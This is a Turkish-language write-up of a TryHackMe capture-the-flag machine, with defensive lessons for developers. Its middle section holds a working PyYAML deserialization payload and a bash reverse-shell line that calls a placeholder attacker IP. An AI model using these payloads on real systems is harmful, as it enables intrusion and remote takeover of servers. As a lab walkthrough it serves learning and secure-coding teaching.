# TryHackMe: Beach Bar — YAML Deserialization ile Root'a

Siber güvenlik tarafına geçiş yapan bir yazılımcıyım. Bu makine, bir web uygulamasındaki YAML deserialization açığını kullanarak shell alıp, process'te açıkta kalan şifreden root'a ulaştığım bir CTF.

## Keşif Yapma

Nmap taramasında iki port buldum:

- **22 (SSH)** — OpenSSH 9.6p1
- **80 (HTTP)** — Gunicorn (Python backend)

Web sitesine gittiğimde "DJ booth sign-in" sayfası çıktı. Kaynak koda baktığımda HTML yorumunda demo login bilgilerini buldum:

```html
<!-- staff note: the demo DJ login is still enabled for the soft opening.
     dj / dj  -- swap this before the season starts (ticket BAR-7) -->
```

Geliştirici yorumları production'da kaldığında ne olur işte bu.

## YAML Deserialization ile Shell Alma

`dj / dj` ile giriş yaptıktan sonra bir DJ dashboard'u açıldı. Playlist import/export özelliği vardı ve YAML formatı kullanıyordu. Python backend + YAML import = potansiyel deserialization açığı.

Önce komut çalışıp çalışmadığını test ettim:

```yaml
!!python/object/apply:subprocess.check_output
- ["id"]
```

Response'da `uid=1001(bartender)` döndü. Komut çalışıyor. Ardından reverse shell aldım:

```yaml
!!python/object/apply:subprocess.check_output
- ["bash", "-c", "bash -i >& /dev/tcp/SALDIRGAN_IP/4444 0>&1"]
```

Dinleyicime bağlantı geldi, `bartender` olarak shell aldım. User flag `/home/bartender/user.txt` içindeydi.

## Yetki Yükseltme

`sudo -l` şifre istedi, SUID binary'lerde ilginç bir şey yoktu, crontab standart. Ama `/opt/beach-bar/` altında `jukeboxd` adında bir servis dikkatimi çekti.

Çalışan process'lere baktığımda:

```
ps aux | grep jukeboxd
root  610  /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass SunsetSpritz2024! --bitrate 320k
```

Root olarak çalışan bir process'in komut satırında şifre açık açık duruyordu. `su root` ile bu şifreyi girip root oldum.

## Kapanış ve Geliştirici Gözünden

Bu makinede HTML yorumundaki credentials'tan giriş yapıp, güvensiz YAML parsing ile shell alıp, process'te açıkta kalan şifreden root oldum.

Bir yazılımcı olarak bu açıkların nasıl önlenebileceğine bakmak istiyorum:

- **HTML Yorumları:** Production build'de HTML yorumları strip edilmeli. Credentials, ticket numaraları gibi bilgiler asla frontend kodunda olmamalı.
- **YAML Deserialization:** PyYAML'da `yaml.load()` yerine `yaml.safe_load()` kullanılmalı. Unsafe loader kullanıcı girdisini deserialize ettiğinde arbitrary code execution mümkün.
- **Process'te Şifre:** Şifreler komut satırı argümanı olarak geçirilmemeli — `ps aux` ile herkes görebilir. Bunun yerine environment variable veya config dosyası kullanılmalı.
